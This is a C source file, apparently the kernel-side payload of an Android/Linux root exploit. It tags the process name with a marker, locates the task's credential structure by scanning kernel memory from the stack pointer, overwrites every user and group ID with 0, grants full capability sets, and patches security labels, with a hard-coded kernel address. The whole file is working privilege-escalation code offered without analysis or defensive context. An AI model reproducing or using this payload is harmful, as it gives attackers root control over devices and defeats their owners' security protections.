#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

struct kernel_cap_struct {
	unsigned long cap[2];
};
struct cred0 {
	unsigned long usage;
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
	unsigned long securebits;
	struct kernel_cap_struct cap_inheritable;
	struct kernel_cap_struct cap_permitted;
	struct kernel_cap_struct cap_effective;
	struct kernel_cap_struct cap_bset;
	unsigned char jit_keyring;
	void *thread_keyring;
	void *request_key_auth;
	void *tgcred;
	struct task_security_struct *security;

	/* ... */
};
struct cred1 {
	unsigned long usage;
	unsigned long unknow[3];
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
	unsigned long securebits;
	struct kernel_cap_struct cap_inheritable;
	struct kernel_cap_struct cap_permitted;
	struct kernel_cap_struct cap_effective;
	struct kernel_cap_struct cap_bset;
	unsigned char jit_keyring;
	void *thread_keyring;
	void *request_key_auth;
	void *tgcred;
	struct task_security_struct *security;

	/* ... */
};
struct list_head {
	struct list_head *next;
	struct list_head *prev;
};
struct task_struct_partial_0 {
	volatile long state; /* -1 unrunnable, 0 runnable, >0 stopped */
	void *stack;
};
struct task_struct_partial_1 {
	struct list_head cpu_timers[3];
	struct cred *real_cred;
	struct cred *cred;
	struct cred *replacement_session_keyring;
	char comm[16];
};
struct thread_info_partial {
	unsigned long flags; /* low level flags */
	int preempt_count; /* 0 => preemptable, <0 => bug */
	unsigned long addr_limit; /* address limit */
	struct task_struct *task; /* main task structure */
	struct exec_domain *exec_domain; /* execution domain */
	/* ... */
};
struct credCompound {
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
	unsigned long securebits;
	struct kernel_cap_struct cap_inheritable;
	struct kernel_cap_struct cap_permitted;
	struct kernel_cap_struct cap_effective;
	struct kernel_cap_struct cap_bset;
	unsigned char jit_keyring;
	void *thread_keyring;
	void *request_key_auth;
	void *tgcred;
	struct task_security_struct *security;

	/* ... */
};

typedef struct _processSt {
	uint32_t ruid;
	uint32_t euid;
	uint32_t suid;
	uint32_t rgid;
	uint32_t egid;
	uint32_t sgid;
	uint32_t label0;
	uint32_t label1;
} ProcessSt;

ProcessSt gProcessSt = { 0 };

int redressFileFds(unsigned int* task_struct);

void initProcessSt() {
	prctl(0xF, "pvR_timewQ");
	getresuid(&gProcessSt.ruid, &gProcessSt.euid, &gProcessSt.suid);
	getresgid(&gProcessSt.rgid, &gProcessSt.egid, &gProcessSt.sgid);
}

int callback() {
	unsigned int stackVariable;
	unsigned int spValue;
	struct thread_info_partial* pThreadInfo;
	struct task_struct_partial_0* taskSt0;
	struct task_struct_partial_1* taskSt1;
	char* addr0;
	unsigned int* addr1;
	int offsetOfUid;
	struct credCompound* cred;
	int aInt12;

	typedef void (*printkFunc)(const char*fmt, ...);
	printkFunc func;

	func = (printkFunc) 0xc05fa73cU;

	spValue = (unsigned int) &stackVariable;
	spValue = spValue & (~0x1FFFUL);
	pThreadInfo = (struct thread_info_partial*) spValue;

	if (pThreadInfo->flags > 0xC0000000UL
			|| (unsigned long) pThreadInfo->preempt_count > 0xC0000000UL
			|| pThreadInfo->addr_limit > 0xC0000000UL) {
		return -1;
	}
	taskSt0 = (struct task_struct_partial_0*) pThreadInfo->task;
	if ((unsigned int) taskSt0 <= 0x40000001UL
			|| (unsigned long) pThreadInfo->exec_domain <= 0x40000001UL) {
		return -2;
	}

	if ((unsigned int) taskSt0->state > 0xC0000000UL
			|| taskSt0->stack != pThreadInfo) {
		return -3;
	}


	addr0 = (char*) taskSt0;
	do {
		if (*(addr0++) == 'p' && *addr0 == 'v' && *(addr0 + 1) == 'R'
				&& *(addr0 + 2) == '_') {

			taskSt1 = (struct task_struct_partial_1*) (addr0 - 1 + 16
					- sizeof(struct task_struct_partial_1));

			redressFileFds( (unsigned int*)(addr0 - 1 + 16) );

			addr1 = (unsigned int*) taskSt1->cred;

			if ((unsigned int) addr1 <= 0x40000001UL) {
				return -4;
			}

			if (*(addr1 + 3) == 0x43736564/*desC*/
					|| *(addr1 + 3) == 0x44656144/*DaeD*/) {
				offsetOfUid = 4;
			} else {
				offsetOfUid = 1;
			}

			cred = (struct credCompound*) (addr1 + offsetOfUid);

			if (cred->uid != gProcessSt.ruid || cred->gid != gProcessSt.rgid
					|| cred->suid != gProcessSt.suid
					|| cred->sgid != gProcessSt.sgid
					|| cred->euid != gProcessSt.euid
					|| cred->egid != gProcessSt.egid) {
				return -5;
			}

			cred->uid = 0;
			cred->gid = 0;
			cred->suid = 0;
			cred->sgid = 0;
			cred->euid = 0;
			cred->egid = 0;
			cred->fsuid = 0;
			cred->fsgid = 0;

			cred->cap_inheritable.cap[0] = 0xFFFFFFFFU;
			cred->cap_inheritable.cap[1] = 0xFFFFFFFFU;
			cred->cap_permitted.cap[0] = 0xFFFFFFFFU;
			cred->cap_permitted.cap[1] = 0xFFFFFFFFU;
			cred->cap_effective.cap[0] = 0xFFFFFFFFU;
			cred->cap_effective.cap[1] = 0xFFFFFFFFU;
			cred->cap_bset.cap[0] = 0xFFFFFFFFU;
			cred->cap_bset.cap[1] = 0xFFFFFFFFU;

			if (0 == gProcessSt.label0) {
				return 1;
			}

			aInt12 = offsetOfUid + (gProcessSt.label1 << 2) + 0x11;
			if (*(addr1 + aInt12) > 0xC0000000UL) {
				*((unsigned int*) *(addr1 + aInt12)) = 1;
				*((unsigned int*) *(addr1 + aInt12) + 1) = 1;
				return 1;
			}
			return 1;
		}
	} while (addr0 < (char*) taskSt0 + 0x400);

	return -6;
}
